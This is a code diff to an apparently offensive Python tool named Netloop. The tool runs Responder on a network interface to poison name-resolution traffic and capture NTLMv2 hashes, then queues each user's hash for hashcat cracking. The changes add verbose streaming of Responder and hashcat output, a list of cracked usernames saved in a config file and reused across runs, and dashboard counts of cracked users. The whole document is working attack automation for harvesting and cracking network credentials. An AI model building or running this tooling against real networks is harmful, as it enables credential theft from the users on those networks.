@@ -81,10 +81,17 @@ class CrackState:
     cracked_seen: Set[str] = field(default_factory=set)
     completed_jobs: int = 0
     hashcat_errors: int = 0
+    cracked_users: Set[str] = field(default_factory=set)
+    previously_cracked_seen_this_run: Set[str] = field(default_factory=set)
 
 
 def strip_ansi(text: str) -> str:
     return ANSI_RE.sub("", text)
+
+
+def verbose_print(enabled: bool, line: str) -> None:
+    if enabled:
+        print(line, flush=True)
 
 
 def sanitize_for_filename(value: str) -> str:
@@ -168,6 +175,23 @@ def load_config() -> dict:
         return {}
 
 
+def load_cracked_users() -> Set[str]:
+    cfg = load_config()
+    ntlmv2_cfg = cfg.get("ntlmv2", {})
+    users = ntlmv2_cfg.get("cracked_users", [])
+    if not isinstance(users, list):
+        return set()
+    return {str(user) for user in users if str(user).strip()}
+
+
+def save_cracked_users(cracked_users: Set[str]) -> None:
+    cfg = load_config()
+    ntlmv2_cfg = cfg.get("ntlmv2", {})
+    ntlmv2_cfg["cracked_users"] = sorted(cracked_users)
+    cfg["ntlmv2"] = ntlmv2_cfg
+    save_config(cfg)
+
+
 def save_config(config: dict) -> None:
     try:
         HOME_CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")
@@ -191,6 +215,12 @@ def build_parser() -> argparse.ArgumentParser:
     ntlmv2.add_argument("--responder-flags", help="extra responder flags")
     ntlmv2.add_argument("--wordlist", help="wordlist path for hashcat")
     ntlmv2.add_argument("--hashcat-flags", help="extra/default hashcat flags")
+    ntlmv2.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="show full responder/hashcat output for debugging",
+    )
     ntlmv2.add_argument(
         "--auto-stop-seconds",
         type=int,
@@ -306,6 +336,14 @@ def read_hashes_from_files(session_dir: Path, stats: Stats) -> None:
 
 def enqueue_new_hashes_for_cracking(stats: Stats, crack_state: CrackState) -> None:
     for user in sorted(stats.user_to_hash.keys()):
+        if user in crack_state.cracked_users:
+            crack_state.processed_users.add(user)
+            if user not in crack_state.previously_cracked_seen_this_run:
+                crack_state.previously_cracked_seen_this_run.add(user)
+                crack_state.cracked_lines.append(
+                    f"{user}::PREVIOUSLY_CRACKED:already-cracked-in-earlier-run"
+                )
+            continue
         if user in crack_state.processed_users:
             continue
         if user == crack_state.active_user:
@@ -371,7 +409,7 @@ def start_next_hashcat_job(
     )
 
 
-def poll_hashcat_state(crack_state: CrackState) -> None:
+def poll_hashcat_state(crack_state: CrackState, verbose: bool = False) -> None:
     proc = crack_state.active_proc
     if proc is None or proc.stdout is None:
         return
@@ -384,6 +422,7 @@ def poll_hashcat_state(crack_state: CrackState) -> None:
         line = proc.stdout.readline()
         if not line:
             break
+        verbose_print(verbose, line.rstrip("\n"))
         clean = strip_ansi(line).strip()
         if not clean:
             continue
@@ -404,6 +443,7 @@ def finalize_hashcat_job(
     crack_state: CrackState,
     hashcat_path: str,
     hashcat_flags: List[str],
+    verbose: bool = False,
 ) -> None:
     proc = crack_state.active_proc
     user = crack_state.active_user
@@ -414,6 +454,7 @@ def finalize_hashcat_job(
     if proc.stdout is not None:
         # Drain remaining output, harvesting final status JSON if present.
         for line in proc.stdout:
+            verbose_print(verbose, line.rstrip("\n"))
             clean = strip_ansi(line).strip()
             if not clean:
                 continue
@@ -443,6 +484,10 @@ def finalize_hashcat_job(
             continue
         crack_state.cracked_seen.add(clean_row)
         crack_state.cracked_lines.append(clean_row)
+        if "::" in clean_row:
+            cracked_user = clean_row.split("::", 1)[0].strip()
+            if cracked_user:
+                crack_state.cracked_users.add(cracked_user)
 
     crack_state.completed_jobs += 1
     crack_state.processed_users.add(user)
@@ -493,6 +538,7 @@ def render_live_dashboard(
     recent_cracks = crack_state.cracked_lines[-2:]
     recent_lines = [f"  {line}" for line in recent_cracks] if recent_cracks else ["  none yet"]
     users_line = format_usernames(stats.unique_users)
+    cracked_user_count = len(stats.unique_users.intersection(crack_state.cracked_users))
 
     return [
         c("Netloop Live Overview", Color.BOLD),
@@ -508,7 +554,7 @@ def render_live_dashboard(
         cracking_line,
         (
             f"Crack queue: {queue_depth} | Completed jobs: {crack_state.completed_jobs} | "
-            f"Cracked: {len(crack_state.cracked_lines)}"
+            f"Cracked users: {cracked_user_count}"
         ),
         "Recent cracked:",
         *recent_lines,
@@ -547,6 +593,8 @@ def run_capture_and_crack(
     session_dir: Path,
     stats: Stats,
     auto_stop_seconds: int,
+    persisted_cracked_users: Set[str],
+    verbose: bool = False,
 ) -> Tuple[int, CrackState]:
     responder_path = shutil.which("responder")
     if not responder_path:
@@ -558,6 +606,8 @@ def run_capture_and_crack(
 
     cmd = [responder_path, "-I", interface] + shlex.split(responder_flags)
     print(c(f"Starting responder: {' '.join(cmd)}", Color.CYAN))
+    if verbose:
+        print(c("Verbose mode enabled: streaming responder/hashcat output.", Color.YELLOW))
 
     interrupted = False
     proc = subprocess.Popen(
@@ -572,7 +622,7 @@ def run_capture_and_crack(
     start = time.time()
     session_name_prefix = f"netloop-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
     parsed_hashcat_flags = shlex.split(hashcat_flags)
-    crack_state = CrackState()
+    crack_state = CrackState(cracked_users=set(persisted_cracked_users))
     responder_logs = discover_responder_log_paths(session_dir)
     log_offsets: Dict[Path, int] = {}
     for log_path in responder_logs:
@@ -581,10 +631,13 @@ def run_capture_and_crack(
         except OSError:
             log_offsets[log_path] = 0
 
-    dashboard_lines = render_live_dashboard(
-        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
-    )
-    dashboard_height = draw_live_dashboard(dashboard_lines, previous_line_count=0)
+    dashboard_lines: List[str] = []
+    dashboard_height = 0
+    if not verbose:
+        dashboard_lines = render_live_dashboard(
+            stats, crack_state, interface, responder_flags, start, auto_stop_seconds
+        )
+        dashboard_height = draw_live_dashboard(dashboard_lines, previous_line_count=0)
     auto_stop_triggered = False
     last_refresh = 0.0
     responder_stop_requested = False
@@ -600,6 +653,7 @@ def run_capture_and_crack(
                     if ready:
                         line = proc.stdout.readline()
                         if line:
+                            verbose_print(verbose, line.rstrip("\n"))
                             parse_responder_stream_line(line.rstrip("\n"), stats)
                 poll_responder_logs(stats, log_offsets, responder_logs)
                 responder_logs, log_offsets = refresh_responder_log_paths(
@@ -619,9 +673,11 @@ def run_capture_and_crack(
                             session_dir,
                             session_name_prefix,
                         )
-                    poll_hashcat_state(crack_state)
+                    poll_hashcat_state(crack_state, verbose=verbose)
                     if crack_state.active_proc and crack_state.active_proc.poll() is not None:
-                        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags)
+                        finalize_hashcat_job(
+                            crack_state, hashcat_path, parsed_hashcat_flags, verbose=verbose
+                        )
                 else:
                     if not hashcat_missing_warned:
                         hashcat_missing_warned = True
@@ -631,7 +687,7 @@ def run_capture_and_crack(
                             print(c(f"Warning: wordlist not found: {wordlist}. Capture only mode.", Color.YELLOW))
 
                 now = time.time()
-                if now - last_refresh >= 1.0:
+                if not verbose and now - last_refresh >= 1.0:
                     dashboard_lines = render_live_dashboard(
                         stats, crack_state, interface, responder_flags, start, auto_stop_seconds
                     )
@@ -681,7 +737,7 @@ def run_capture_and_crack(
             proc.wait()
 
     if crack_state.active_proc and crack_state.active_proc.poll() is not None and hashcat_path:
-        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags)
+        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags, verbose=verbose)
 
     # Move to a clean line after in-place dashboard rendering and print stop reason.
     print()
@@ -739,6 +795,7 @@ def resolve_inputs(parsed_args: argparse.Namespace) -> Tuple[str, str, str, str]
         "responder_flags": responder_flags,
         "wordlist": wordlist,
         "hashcat_flags": hashcat_flags,
+        "cracked_users": ntlmv2_cfg.get("cracked_users", []),
     }
     save_config(cfg)
     return interface, responder_flags, wordlist, hashcat_flags
@@ -760,6 +817,7 @@ def main() -> int:
         return 2
 
     interface, responder_flags, wordlist, hashcat_flags = resolve_inputs(parsed_args)
+    persisted_cracked_users = load_cracked_users()
     session_stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
     session_dir = Path.cwd() / "netloop_runs" / session_stamp
     session_dir.mkdir(parents=True, exist_ok=True)
@@ -774,7 +832,10 @@ def main() -> int:
         session_dir,
         stats,
         parsed_args.auto_stop_seconds,
+        persisted_cracked_users,
+        verbose=parsed_args.verbose,
     )
+    save_cracked_users(crack_state.cracked_users)
 
     # Pull hashes from responder output files too, not just stdout.
     read_hashes_from_files(session_dir, stats)
@@ -790,12 +851,17 @@ def main() -> int:
     unique_hash_file = write_unique_hash_file(session_dir, stats.user_to_hash)
     cracked_display = format_cracked_rows(crack_state.cracked_lines)
     crack_rc = 0 if crack_state.hashcat_errors == 0 else 1
+    cracked_users_this_capture = sorted(stats.unique_users.intersection(crack_state.cracked_users))
 
     print("\n" + c("Overview", Color.BOLD))
     print(f"- Poisoned messages: {stats.poisoned_messages}")
     print(f"- NTLMv2 hashes captured: {stats.ntlmv2_hash_lines}")
     print(f"- Unique users with captured hashes: {len(stats.unique_users)}")
     print(f"- Unique usernames: {', '.join(sorted(stats.unique_users)) if stats.unique_users else 'none'}")
+    print(
+        f"- Considered cracked users this run: "
+        f"{', '.join(cracked_users_this_capture) if cracked_users_this_capture else 'none'}"
+    )
     print(f"- Hash input file (one per user): {unique_hash_file}")
     print(f"- Hashcat jobs completed: {crack_state.completed_jobs}")
     print(f"- Hashcat job errors: {crack_state.hashcat_errors}")
